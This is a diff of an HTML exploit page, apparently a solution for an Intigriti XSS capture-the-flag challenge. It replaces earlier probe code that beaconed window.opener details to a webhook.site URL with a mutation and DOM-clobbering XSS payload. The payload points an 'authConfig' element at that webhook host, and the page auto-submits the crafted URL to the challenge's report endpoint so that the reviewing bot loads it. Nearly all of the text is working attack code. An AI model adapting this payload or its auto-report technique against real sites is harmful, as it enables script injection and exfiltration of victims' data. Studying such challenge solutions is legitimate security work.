@@ -3,43 +3,20 @@
 <body>
 <script>
 const hook = 'https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c';
-const id = Math.random().toString(36).slice(2);
+const payload = `<form><h1></form><img name="authConfig" data-next="${hook}" data-append="true"><table><form></form></table></form></table></h1></form><math><mi><style><!--</style><style title="--></style><img src=x>"></style></mi></math>`;
+const vulnUrl = 'https://challenge-0326.intigriti.io/challenge.html?q=' + encodeURIComponent(payload);
 
-function ping(step, extra = '') {
-  const url = `${hook}?step=${encodeURIComponent(step)}&id=${encodeURIComponent(id)}${extra}`;
-  const img = new Image();
-  img.src = url;
-}
+const f = document.createElement('form');
+f.method = 'POST';
+f.action = 'https://challenge-0326.intigriti.io/report';
 
-ping('loaded');
+const i = document.createElement('input');
+i.name = 'url';
+i.value = vulnUrl;
 
-try {
-  ping('opener_exists', `&value=${encodeURIComponent(String(!!window.opener))}`);
-} catch (e) {
-  ping('opener_exists_err', `&value=${encodeURIComponent(String(e))}`);
-}
-
-try {
-  if (window.opener) {
-    ping('opener_closed', `&value=${encodeURIComponent(String(window.opener.closed))}`);
-  }
-} catch (e) {
-  ping('opener_closed_err', `&value=${encodeURIComponent(String(e))}`);
-}
-
-try {
-  if (window.opener) {
-    window.opener.location = 'https://challenge-0326.intigriti.io/challenge.html?from=opener_probe';
-    ping('opener_nav_attempted', '&value=true');
-  }
-} catch (e) {
-  ping('opener_nav_err', `&value=${encodeURIComponent(String(e))}`);
-}
-
-setTimeout(() => {
-  ping('done');
-}, 1500);
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
 </script>
-OK
 </body>
 </html>
